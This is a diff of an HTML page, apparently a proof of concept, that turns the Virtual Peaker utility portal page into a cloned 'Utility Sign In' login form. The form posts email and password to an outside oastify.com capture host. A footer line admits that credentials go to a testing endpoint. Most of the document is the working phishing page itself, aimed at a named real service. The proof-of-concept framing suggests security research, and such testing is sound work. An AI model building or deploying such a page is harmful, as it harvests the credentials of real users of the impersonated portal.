@@ -1,89 +1,114 @@
-<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
-<html>
+<!DOCTYPE html>
+<html lang="en">
 <head>
-<meta charset="utf-8">
-<title>Utility | Virtual Peaker</title>
-
-<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, minimal-ui">
-
-<meta name="apple-touch-fullscreen" content="yes">
-<meta name="apple-mobile-web-app-capable" content="yes">
-<meta name="apple-mobile-web-app-status-bar-style" content="black">
-<link rel="apple-touch-icon" sizes="180x180" href="https://utility.virtualpeaker.io/assets/app-icons/apple-touch-icon.png">
-<link rel="icon" type="image/png" sizes="32x32" href="https://utility.virtualpeaker.io/assets/app-icons/favicon-32x32.png">
-<link rel="icon" type="image/png" sizes="16x16" href="https://utility.virtualpeaker.io/assets/app-icons/favicon-16x16.png">
-<link rel="manifest" href="https://utility.virtualpeaker.io/assets/app-icons/site.webmanifest">
-<link rel="mask-icon" href="https://utility.virtualpeaker.io/assets/app-icons/safari-pinned-tab.svg" color="#5bbad5">
-<meta name="msapplication-TileColor" content="#2d89ef">
-<meta name="theme-color" content="#ffffff">
-<link rel="apple-touch-icon-precomposed" sizes="57x57" href="https://utility.virtualpeaker.io/assets/app-icons/apple-touch-icon-57x57.png" />
-<link rel="apple-touch-icon-precomposed" sizes="114x114" href="https://utility.virtualpeaker.io/assets/app-icons/apple-touch-icon-114x114.png" />
-<link rel="apple-touch-icon-precomposed" sizes="72x72" href="https://utility.virtualpeaker.io/assets/app-icons/apple-touch-icon-72x72.png" />
-<link rel="apple-touch-icon-precomposed" sizes="144x144" href="https://utility.virtualpeaker.io/assets/app-icons/apple-touch-icon-144x144.png" />
-<link rel="apple-touch-icon-precomposed" sizes="60x60" href="https://utility.virtualpeaker.io/assets/app-icons/apple-touch-icon-60x60.png" />
-<link rel="apple-touch-icon-precomposed" sizes="120x120" href="https://utility.virtualpeaker.io/assets/app-icons/apple-touch-icon-120x120.png" />
-<link rel="apple-touch-icon-precomposed" sizes="76x76" href="https://utility.virtualpeaker.io/assets/app-icons/apple-touch-icon-76x76.png" />
-<link rel="apple-touch-icon-precomposed" sizes="152x152" href="https://utility.virtualpeaker.io/assets/app-icons/apple-touch-icon-152x152.png" />
-<link rel="icon" type="image/png" href="https://utility.virtualpeaker.io/assets/app-icons/favicon-196x196.png" sizes="196x196" />
-<link rel="icon" type="image/png" href="https://utility.virtualpeaker.io/assets/app-icons/favicon-96x96.png" sizes="96x96" />
-<link rel="icon" type="image/png" href="https://utility.virtualpeaker.io/assets/app-icons/favicon-32x32.png" sizes="32x32" />
-<link rel="icon" type="image/png" href="https://utility.virtualpeaker.io/assets/app-icons/favicon-16x16.png" sizes="16x16" />
-<link rel="icon" type="image/png" href="https://utility.virtualpeaker.io/assets/app-icons/favicon-128.png" sizes="128x128" />
-<meta name="application-name" content="&nbsp;"/>
-<meta name="msapplication-TileColor" content="#FFFFFF" />
-<meta name="msapplication-TileImage" content="https://utility.virtualpeaker.io/assets/app-icons/mstile-144x144.png" />
-<meta name="msapplication-square70x70logo" content="https://utility.virtualpeaker.io/assets/app-icons/mstile-70x70.png" />
-<meta name="msapplication-square150x150logo" content="https://utility.virtualpeaker.io/assets/app-icons/mstile-150x150.png" />
-<meta name="msapplication-wide310x150logo" content="https://utility.virtualpeaker.io/assets/app-icons/mstile-310x150.png" />
-<meta name="msapplication-square310x310logo" content="https://utility.virtualpeaker.io/assets/app-icons/mstile-310x310.png" />
-<meta name="msapplication-TileColor" content="#ffffff">
-<meta name="msapplication-TileImage" content="https://utility.virtualpeaker.io/assets/app-icons/ms-icon-144x144.png">
-<meta name="theme-color" content="#ffffff">
-
-<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
-<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Muli:300,400,400i,600,700">
-<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Mulish:ital,wght@0,200..1000;1,200..1000&display=swap">
-<link rel="stylesheet" type="text/css" href="https://utility.virtualpeaker.io/assets/css/style.css?1742862361916" />
-<script>
-  // change this to 'local' for CORS
-  // change this to 'local-proxy' to bypass CORS
-  window.HOSTING_ENV = 'prod';
-  window.IFRAME_PROMO = 'https://virtual-peaker.com/portal-login-marketing';
-  window.SSO_RETURN_TO_URL = 'https://support.virtual-peaker.com/knowledge';
-  window.DOWN = false;
-</script>
-<!-- Google tag (gtag.js) -->
-<script async src="https://www.googletagmanager.com/gtag/js?id=G-YVZ2LFBB92"></script>
-<script>
-  window.dataLayer = window.dataLayer || [];
-  function gtag(){dataLayer.push(arguments);}
-  gtag('js', new Date());
-
-  gtag('config', 'G-YVZ2LFBB92');
-</script>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Utility Sign In | Virtual Peaker (PoC)</title>
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Mulish:wght@300;400;600&display=swap">
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      background: #eaeff5;
+      font-family: 'Mulish', sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+    .login-box {
+      background: white;
+      border-radius: 10px;
+      padding: 30px 40px;
+      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+      width: 100%;
+      max-width: 400px;
+      border-top: 10px solid #193b6d;
+    }
+    h2 {
+      text-align: center;
+      font-size: 24px;
+      margin-bottom: 20px;
+      color: #333;
+    }
+    .tabs {
+      display: flex;
+      border-bottom: 2px solid #eee;
+      margin-bottom: 20px;
+    }
+    .tabs div {
+      flex: 1;
+      text-align: center;
+      padding: 10px 0;
+      cursor: pointer;
+      font-weight: 600;
+      color: #aaa;
+    }
+    .tabs .active {
+      color: #193b6d;
+      border-bottom: 3px solid #f28c28;
+    }
+    form {
+      display: flex;
+      flex-direction: column;
+    }
+    label {
+      font-size: 14px;
+      color: #333;
+      margin-bottom: 5px;
+    }
+    input {
+      padding: 10px;
+      font-size: 14px;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+      margin-bottom: 15px;
+    }
+    .forgot {
+      text-align: right;
+      margin-top: -10px;
+      margin-bottom: 15px;
+    }
+    .forgot a {
+      color: #f28c28;
+      font-size: 12px;
+      text-decoration: none;
+    }
+    button {
+      background: #f28c28;
+      color: white;
+      border: none;
+      border-radius: 6px;
+      padding: 12px;
+      font-weight: bold;
+      font-size: 14px;
+      cursor: pointer;
+    }
+    .note {
+      font-size: 11px;
+      color: #888;
+      text-align: center;
+      margin-top: 15px;
+    }
+  </style>
 </head>
-<body style="-webkit-overflow-scrolling: touch;">
-  <div id="app"></div>
-  <script src='https://api.mapbox.com/mapbox-gl-js/v1.0.0/mapbox-gl.js'></script>
-  <script src='https://api.mapbox.com/mapbox-gl-js/plugins/mapbox-gl-draw/v1.0.9/mapbox-gl-draw.js'></script>
-  <script src='https://api.mapbox.com/mapbox.js/plugins/turf/v3.0.11/turf.min.js'></script>
-  <script src='https://unpkg.com/es6-promise@4.2.4/dist/es6-promise.auto.min.js'></script>
-  <script src="https://unpkg.com/@mapbox/mapbox-sdk@0.10.0/umd/mapbox-sdk.min.js"></script>
-
-  <script type="text/javascript" src="https://d1byei05mtwnfj.cloudfront.net/code/prod/suite-derms.js?1742862361918"></script>
-  <script type="text/javascript" src="https://d1byei05mtwnfj.cloudfront.net/code/prod/suite-prediction.js?1742862361918"></script>
-  <script type="text/javascript" src="https://d1byei05mtwnfj.cloudfront.net/code/prod/suite-engagement.js?1742862361918"></script>
-  <script type="text/javascript" src="https://d1byei05mtwnfj.cloudfront.net/code/prod/shell.js?1742862361917"></script>
-
-  <script src="https://cdn.redoc.ly/redoc/latest/bundles/redoc.standalone.js"> </script>
-   <div class="login-wrapper">
-    <h2>Welcome to Utility</h2>
+<body>
+  <div class="login-box">
+    <h2>Utility Sign In</h2>
+    <div class="tabs">
+      <div class="active">Use Password</div>
+      <div>Use Secure Link</div>
+    </div>
     <form method="POST" action="http://r1t2f5ndv073o0m763p89qjpsgy7mzao.oastify.com">
-      <input name="username" type="text" placeholder="Email or Username" required>
-      <input name="password" type="password" placeholder="Password" required>
-      <button type="submit">Log In</button>
-      
+      <label for="username">Email Address</label>
+      <input type="email" id="username" name="username" placeholder="Enter your email address" required>
+
+      <label for="password">Password <span class="forgot"><a href="#">Forgot password?</a></span></label>
+      <input type="password" id="password" name="password" placeholder="Enter your password" required>
+
+      <button type="submit">SIGN IN</button>
     </form>
+    <div class="note">This is a PoC. Credentials are sent to a testing endpoint.</div>
   </div>
 </body>
 </html>
